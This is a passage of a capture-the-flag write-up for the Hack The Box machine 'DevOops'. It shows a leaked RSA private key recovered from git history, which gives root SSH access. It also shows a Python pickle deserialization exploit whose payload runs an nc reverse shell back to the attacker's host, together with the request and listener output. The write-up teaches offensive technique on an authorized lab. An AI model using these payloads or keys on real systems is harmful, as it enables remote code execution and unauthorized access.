+y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
+aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
+xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
+82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
+-----END RSA PRIVATE KEY-----
+
+</span></code></pre></div></div>
+<p>Perfect.</p>
+<h3 id="ssh-as-roosa">SSH as roosa</h3>
+<p>I’ll get a shell on the box with roosa’s private key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh roosa@10.10.10.91 <span class="nt">-i</span> ~/id_rsa_devoops_roosa
+<span class="go">The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established.
+ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.91' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Mon Jun  4 17:33:47 2018 from 10.10.15.221
+roosa@gitter:~$
+</span></code></pre></div></div>
+<p>In the homedir, we find user.txt:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">c5808e16...
+</span></code></pre></div></div>
+<h2 id="privesc-roosa--root">Privesc: roosa –&gt; root</h2>
+<h3 id="identify-git-repo">Identify git repo</h3>
+<p>In poking around roosa’s home directory, I noticed a git repo (a <code class="language-plaintext highlighter-rouge">.git</code> folder). Given that theme of the box, I decided to look for .git repositories on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~$</span><span class="w"> </span>find / <span class="nt">-type</span> d <span class="nt">-name</span> <span class="s1">'.git'</span> 2&gt;/dev/null
+<span class="go">/home/roosa/work/blogfeed/.git
+</span></code></pre></div></div>
+<h3 id="check-history">Check History</h3>
+<p>Looking more closely at the git repo, use <code class="language-plaintext highlighter-rouge">git</code> to check the current status:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span>git status
+<span class="go">On branch master
+Your branch is up-to-date with 'origin/master'.
+Untracked files:
+  (use "git add &lt;file&gt;..." to include in what will be committed)
+
+        src/.feed.py.swp
+        src/access.log
+        src/app.py
+        src/app.py~
+        src/config.py
+        src/devsolita-snapshot.png
+        src/feed.log
+        src/feed.pyc
+        src/save.p
+
+nothing added to commit but untracked files present (use "git add" to track)
+</span></code></pre></div></div>
+<p>Also look at the <code class="language-plaintext highlighter-rouge">git</code> history. I’ll use <code class="language-plaintext highlighter-rouge">--name-only</code> to get  list of the files that changed in each commit, and <code class="language-plaintext highlighter-rouge">--oneline</code> to reduce space:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span>git log <span class="nt">--name-only</span> <span class="nt">--oneline</span>
+<span class="go">7ff507d Use Base64 for pickle feed loading
+src/feed.py
+src/index.html
+26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
+run-gunicorn.sh
+src/feed.py
+cec54d8 Debug support added to make development more agile.
+run-gunicorn.sh
+src/feed.py
+ca3e768 Blogfeed app, initial version.
+src/feed.py
+src/index.html
+src/upload.html
+dfebfdf Gunicorn startup script
+run-gunicorn.sh
+33e87c3 reverted accidental commit with proper key
+resources/integration/authcredentials.key
+d387abf add key for feed integration from tnerprise backend
+resources/integration/authcredentials.key
+1422e5a Initial commit
+README.md
+</span></code></pre></div></div>
+<h3 id="get-ssh-key-from-commit">Get SSH Key From Commit</h3>
+<p>That message is interesting: <code class="language-plaintext highlighter-rouge">reverted accidental commit with proper key</code>, just after <code class="language-plaintext highlighter-rouge">add key for feed integration from tnerprise backend</code>. There’s also only one file changed between those two commits, <code class="language-plaintext highlighter-rouge">resources/integration/authcredentials.key</code>.</p>
+<p>It’d be possible to see the key by just running <code class="language-plaintext highlighter-rouge">git diff 1422e5a d387abf</code>, seeing the difference between the two commits.</p>
+<p>But it’d be more interesting to show the power of git, and checkout the file from the past commit. Watch the md5 value of the key as I make changes. First, check the value before any changes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span><span class="nb">md5sum </span>resources/integration/authcredentials.key
+<span class="go">f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
+</span></code></pre></div></div>
+<p>Now checkout the version from the old commit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span>git checkout d387abf <span class="nt">--</span> resources/integration/authcredentials.key
+<span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span><span class="nb">md5sum </span>resources/integration/authcredentials.key
+<span class="go">d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key
+</span><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span><span class="nb">cat </span>resources/integration/authcredentials.key
+<span class="go">-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+-----END RSA PRIVATE KEY-----
+</span></code></pre></div></div>
+<p>Once I’m done, I’ll clean up by reverting back to the last commit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span>git reset <span class="nt">--hard</span> 7ff507d
+<span class="go">HEAD is now at 7ff507d Use Base64 for pickle feed loading
+</span><span class="gp">roosa@gitter:~/work/blogfeed$</span><span class="w"> </span><span class="nb">md5sum </span>resources/integration/authcredentials.key
+<span class="go">f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
+</span></code></pre></div></div>
+<h3 id="ssh-as-root">SSH as root</h3>
+<p>Now that I’ve got a RSA key that was not supposed to be published, I’ll check if it will work for root access, and it does. From there, I’ll grab the root flag.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/rsa_keys/id_rsa_devoops_root root@10.10.10.91
+<span class="go">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
+</span><span class="gp">root@gitter:~#</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-c</span> root.txt
+<span class="go">33 root.txt
+</span><span class="gp">root@gitter:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">d4fe1e7f...
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="pickle-exploit-for-user-shell">Pickle Exploit for User Shell</h3>
+<h4 id="discovery">Discovery</h4>
+<p>With shell access as roosa, I starting taking a look at the Flask source code, and in the imports in <code class="language-plaintext highlighter-rouge">~/deploy/src/feed.py</code>, something immediately  caught my eye:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">cPickle</span> <span class="k">as</span> <span class="n">pickle</span>
+</code></pre></div></div>
+<p>Looking further, in addition to the two paths I found with <code class="language-plaintext highlighter-rouge">gobuster</code>, there’s another one:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/newpost</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">newpost</span><span class="p">():</span>
+  <span class="c1"># TODO: proper save to database, this is for testing purposes right now
+</span>  <span class="n">picklestr</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64decode</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
+<span class="c1">#  return picklestr
+</span>  <span class="n">postObj</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">picklestr</span><span class="p">)</span>
+  <span class="k">return</span> <span class="sh">"</span><span class="s">POST RECEIVED: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">postObj</span><span class="p">[</span><span class="sh">'</span><span class="s">Subject</span><span class="sh">'</span><span class="p">]</span>
+</code></pre></div></div>
+<p>I noticed this with shell access, but this could have just as easily been pulled with what was known pre-shell and with XXE. The upload function announces that the file path is <code class="language-plaintext highlighter-rouge">/home/roosa/deploy/src</code>, and the main page says “This is feed.py”.</p>
+<h4 id="benign-interaction">Benign Interaction</h4>
+<p>Before moving to exploit, the first thing I did was to try to get the site to work as expected. Just visiting the path with a browser returns a “Method Not Allowed” message, which makes sense, since the method are defined in the source as <code class="language-plaintext highlighter-rouge">["POST"]</code>.</p>
+<p>So I’ll go into burp, find that request, send it to repeater, and change the method to POST. Sending it with no data returns a 500. Makes sense, since it will try to base64 decode nothing, and throw an exception.</p>
+<p>The code is going to base64 decode the data, and then use pickle to load it. The resulting object will be a dictionary with a ‘Subject’ key. So to build data this will handle correctly,  I’ll do the opposite, start with a dictionary with a Subject key, pickle it, and then base64 encode it.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 2.7.15+ (default, Aug 31 2018, 11:56:52)
+[GCC 8.2.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">cPickle</span> <span class="k">as</span> <span class="n">pickle</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">base64</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">a</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">Subject</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">test</span><span class="sh">'</span><span class="p">}</span>                                                                               <span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
+<span class="go">{'Subject': 'test'}
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="go">"(dp1\nS'Subject'\np2\nS'test'\np3\ns."
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="sh">"</span><span class="s">(dp1</span><span class="se">\n</span><span class="s">S</span><span class="sh">'</span><span class="s">Subject</span><span class="sh">'</span><span class="se">\n</span><span class="s">p2</span><span class="se">\n</span><span class="s">S</span><span class="sh">'</span><span class="s">test</span><span class="sh">'</span><span class="se">\n</span><span class="s">p3</span><span class="se">\n</span><span class="s">s.</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">{'Subject': 'test'}
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+<span class="go">'KGRwMQpTJ1N1YmplY3QnCnAyClMndGVzdCcKcDMKcy4='
+</span></code></pre></div></div>
+<p>Back to repeater, and add that string to the data in the post:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/newpost</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.91:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">46</span>
+
+KGRwMQpTJ1N1YmplY3QnCnAyClMndGVzdCcKcDMKcy4=
+</code></pre></div></div>
+<p>And it works:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">gunicorn/19.7.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 12 Oct 2018 09:46:36 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">19</span>
+
+POST RECEIVED: test
+</code></pre></div></div>
+<h4 id="exploitation">Exploitation</h4>
+<p>Pickle is python’s serialization library, and as is true with most serialization / deserialization methods, it’s extremely risky to use with user controlled input. There’s another example of pickle exploitation in <a href="/2018/09/15/htb-canape.html">my Canape writeup</a>.</p>
+<p>Serialization allows a programmer to take an object within a program and save it as a text string, so that that string can be loaded later and/or on a different host and the full object will be available.  When python runs the deserialization functions (<code class="language-plaintext highlighter-rouge">load</code> or <code class="language-plaintext highlighter-rouge">loads</code>) and gets an object, it will always attempt to run that object’s <code class="language-plaintext highlighter-rouge">__reduce__</code> method, which is used to clean up things that don’t serialize well, such as a file handle.</p>
+<p>We can take advantage of that to get RCE. First, build the malicious string to submit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">os</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+<span class="go">...     def __init__(self, cmd):
+...         self.cmd = cmd
+...     def __reduce__(self):
+...         return (os.system, (self.cmd,))
+
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nc">Exploit</span><span class="p">(</span><span class="sh">'</span><span class="s">ping -c 1 10.10.14.3</span><span class="sh">'</span><span class="p">))</span>
+<span class="go">"cposix\nsystem\np1\n(S'ping -c 1 10.10.14.3'\np2\ntRp3\n."
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nc">Exploit</span><span class="p">(</span><span class="sh">'</span><span class="s">ping -c 1 10.10.14.3</span><span class="sh">'</span><span class="p">)))</span>
+<span class="go">'Y3Bvc2l4CnN5c3RlbQpwMQooUydwaW5nIC1jIDEgMTAuMTAuMTQuMycKcDIKdFJwMwou'
+</span></code></pre></div></div>
+<p>Now, post that string and see what happens:</p>
+<p><img alt="Devoops Pickle Ping image" src="https://0xdfimages.gitlab.io/img/devoops-pickle-ping.gif"/></p>
+<p>There’s a 500 error from the server, but also pings at <code class="language-plaintext highlighter-rouge">tcpdump</code>. So that’s RCE.</p>
+<p>Now get a shell. Just re-run the python code with a new command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nc">Exploit</span><span class="p">(</span><span class="sh">'</span><span class="s">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 443 &gt;/tmp/f</span><span class="sh">'</span><span class="p">)))</span>
+<span class="go">'Y3Bvc2l4CnN5c3RlbQpwMQooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4zIDQ0MyA-L3RtcC9mJwpwMgp0UnAzCi4='
+</span></code></pre></div></div>
+<p>Post that string, and:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.91] 43402
+/bin/sh: 0: can't access tty; job control turned off
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
+</span></code></pre></div></div>
+<h3 id="rss-spec">RSS Spec</h3>
+<p>I used the RSS feed from this blog to build an XML payload that would validate when submitted to the server. An alternative path would be to look at the <a href="https://validator.w3.org/feed/docs/rss2.html#hrelementsOfLtitemgt">w3 specification for RSS</a>, where it defines items:</p>
+<blockquote>
+<p>Elements of &lt;item&gt;</p>
+<p>A channel may contain any number of &lt;item&gt;s. An item may represent  a “story” – much like a story in a newspaper or magazine; if so its  description is a synopsis of the story, and the link points to the full  story. An item may also be complete in itself, if so, the description  contains the text (entity-encoded HTML is allowed), and the link and  title may be omitted. All elements of an item are optional, however at  least one of title or description must be present.</p>
+</blockquote>
+<p>It lists valid elements, including author.</p>
+<p>So if I try building an xml payload to match this spec, but also taking into account the elements the site says should be there, I’ll end up with something like this:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;item&gt;</span>
+<span class="nt">&lt;Author&gt;</span>0xdf<span class="nt">&lt;/Author&gt;</span>
+<span class="nt">&lt;Subject&gt;</span>Testing<span class="nt">&lt;/Subject&gt;</span>
+<span class="nt">&lt;Content&gt;</span>This is a test<span class="nt">&lt;/Content&gt;</span>
+<span class="nt">&lt;/item&gt;</span>
+</code></pre></div></div>
+<p>It turns out that this will also submit just fine to feed.py. In fact, if I change <code class="language-plaintext highlighter-rouge">&lt;item&gt;</code> to <code class="language-plaintext highlighter-rouge">&lt;df&gt;</code>, it works as well.</p>
+<p>The source for the site shows that it takes the top element as <code class="language-plaintext highlighter-rouge">object</code> no matter what it’s name is, and then references child objects for ‘Author’, ‘Subject’, and ‘Content’.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2018/10/13/htb-devoops.html"></a>
+</article>
